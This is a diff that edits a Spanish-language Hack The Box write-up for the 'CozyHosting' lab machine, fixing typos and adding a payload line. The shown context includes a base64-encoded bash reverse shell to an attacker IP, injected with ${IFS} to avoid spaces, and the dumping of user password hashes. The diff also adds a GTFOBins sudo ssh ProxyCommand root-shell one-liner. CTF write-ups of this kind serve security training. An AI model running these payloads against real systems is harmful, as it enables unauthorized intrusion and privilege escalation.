@@ -34,7 +34,7 @@ Realizamos un escaneo de puertos con Nmap y evidenciamos dos puertos abiertos.
 
 ![](/assets/images/htb-machines-cozyhosting/cozyhosting2.png)
 
-Al ingresar al servicio por el puerto 80, no redirige al dominio “cozyhosting.htb”.
+Al ingresar al servicio por el puerto 80, nos redirige al dominio “cozyhosting.htb”.
 
 ![](/assets/images/htb-machines-cozyhosting/cozyhosting3.png)
 
@@ -76,7 +76,7 @@ Creamos un reverse Shell y lo codificamos en base64.
 
 Ahora vamos a necesitar convertir la carga útil en un formato sin espacios, es decir reemplazar los espacios por ${IFS%??}. Para ello vamos a utilizar el siguiente servicio en línea.
 
-•	https://www.urlencoder.org/es/
+•	https://www.urlencoder.org/es.
 
 •	Carga útil: 	echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjYvNzc3NyAwPiYxCg==" | base64 -d | bash.
 
@@ -106,11 +106,11 @@ Luego de la instalacion, procedemos a leer el archivo descargado. Identificamos 
 
 ![](/assets/images/htb-machines-cozyhosting/cozyhosting17.png)
 
-Iniciamos sesión en el equipo víctima con estas credenciales, listamos el contenido de la tabla user y encontramos dos hashes.
+Iniciamos sesión en el equipo víctima con estas credenciales, listamos el contenido de la tabla users y encontramos dos hashes.
 
 ![](/assets/images/htb-machines-cozyhosting/cozyhosting18.png)
 
-Guardamos esos has en un archivo.
+Guardamos esos hash en un archivo.
 
 ![](/assets/images/htb-machines-cozyhosting/cozyhosting19.png)
 
@@ -137,9 +137,11 @@ Nos vamos a conectar por ssh con las mismas credenciales solo para tener mejor c
 
 Identificamos que comando puede ejecutar el usuario actual con permisos de root.
 
-Existe una carga útil simple en GTFOBINS que permite generar un shell interactivo a través de la opción ProxyCommand.
+Existe una carga útil en GTFOBINS que permite generar un shell interactivo a través de la opción ProxyCommand.
 
-•	Carga útil: https://gtfobins.github.io/gtfobins/ssh/#sudo
+•	https://gtfobins.github.io/gtfobins/ssh/#sudo
+
+•	Carga útil: ssh -o ProxyCommand=';sh 0<&2 1>&2' x
 
 Ahora solo nos queda obtener nuestra segunda flag.
 
